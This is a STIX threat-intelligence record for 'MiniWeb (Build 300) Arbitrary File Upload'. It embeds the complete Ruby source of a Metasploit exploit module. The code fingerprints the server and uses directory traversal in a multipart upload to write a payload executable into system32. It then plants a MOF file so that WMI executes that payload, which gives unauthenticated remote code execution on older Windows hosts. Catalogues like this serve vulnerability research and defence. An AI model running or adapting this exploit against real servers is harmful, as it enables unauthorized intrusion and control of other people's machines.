{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4cff269d-a274-4828-9302-8a39ddc41fc3",
    "created": "2024-08-14T16:54:00.473643Z",
    "modified": "2024-08-14T16:54:00.473647Z",
    "name": "\"MiniWeb (Build 300) Arbitrary File Upload\"",
    "description": " This module exploits a vulnerability in MiniWeb HTTP server (build 300). The software contains a file upload vulnerability that allows an unauthenticated remote attacker to write arbitrary files to the file system.  Code execution can be achieved by first uploading the payload to the remote machine as an exe file, and then upload another mof file, which enables WMI (Management Instrumentation service) to execute the uploaded payload. Please note that this module currently only works for Windows before Vista.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/miniweb_upload_wbem.rb",
            "external_id": "miniweb_upload_wbem.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /MiniWeb/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MiniWeb (Build 300) Arbitrary File Upload\",\n      'Description'    => %q{\n        This module exploits a vulnerability in MiniWeb HTTP server (build 300).\n        The software contains a file upload vulnerability that allows an\n        unauthenticated remote attacker to write arbitrary files to the file system.\n\n        Code execution can be achieved by first uploading the payload to the remote\n        machine as an exe file, and then upload another mof file, which enables\n        WMI (Management Instrumentation service) to execute the uploaded payload.\n        Please note that this module currently only works for Windows before Vista.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'AkaStep', # Initial discovery\n          'bcoles', # Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '92198'],\n          ['OSVDB', '92200'],\n          ['PACKETSTORM', '121168']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Tested on MiniWeb build 300, built on Feb 28 2013\n          # - Windows XP SP3 (EN)\n          ['MiniWeb build 300 on Windows (Before Vista)', {}]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2013-04-09',\n      'DefaultTarget'  => 0))\n\n    register_options([\n      Opt::RPORT(8000),\n      OptInt.new('DEPTH', [true, 'Traversal depth', 10])\n    ])\n\n  end\n\n  def check\n\n    begin\n      uri = normalize_uri(target_uri.path.to_s, \"#{rand_text_alpha(rand(10)+5)}\")\n      res = send_request_cgi({\n        'method'  => 'GET',\n        'uri'     => uri\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE\n      vprint_error(\"Connection failed\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if !res or res.headers['Server'].empty?\n      return Exploit::CheckCode::Unknown\n    elsif res.headers['Server'] =~ /^MiniWeb$/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def upload(filename, filedata)\n\n    print_status(\"Trying to upload '#{::File.basename(filename)}'\")\n    uri   = normalize_uri(target_uri.path.to_s, \"#{rand_text_alpha(rand(10)+5)}\")\n    depth = \"../\" * (datastore['DEPTH'] + rand(10))\n\n    boundary   = \"----WebKitFormBoundary#{rand_text_alphanumeric(10)}\"\n    post_data  = \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"#{depth}#{filename}\\\"\\r\\n\"\n    post_data << \"Content-Type: application/octet-stream\\r\\n\"\n    post_data << \"\\r\\n#{filedata}\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n\n    begin\n      res = send_request_cgi({\n        'method'  => 'POST',\n        'uri'     => uri,\n        'ctype'   => \"multipart/form-data; boundary=#{boundary}\",\n        'data'    => post_data\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n\n    return res\n\n  end\n\n  def exploit\n    fname = \"#{rand_text_alpha(rand(10)+5)}\"\n\n    # upload exe\n    exe_name = \"WINDOWS/system32/#{fname}.exe\"\n    exe = generate_payload_exe\n    print_status(\"Sending executable (#{exe.length.to_s} bytes)\")\n    upload(exe_name, exe)\n\n    # upload mof\n    mof_name = \"WINDOWS/system32/wbem/mof/#{fname}.mof\"\n    mof = generate_mof(::File.basename(mof_name), ::File.basename(exe_name))\n    print_status(\"Sending MOF (#{mof.length.to_s} bytes)\")\n    upload(mof_name, mof)\n\n    # list files to clean up\n    register_file_for_cleanup(\"#{::File.basename(exe_name)}\")\n    register_file_for_cleanup(\"wbem\\\\mof\\\\good\\\\#{::File.basename(mof_name)}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-04-09",
    "x_mitre_platforms": [
        "win'"
    ]
}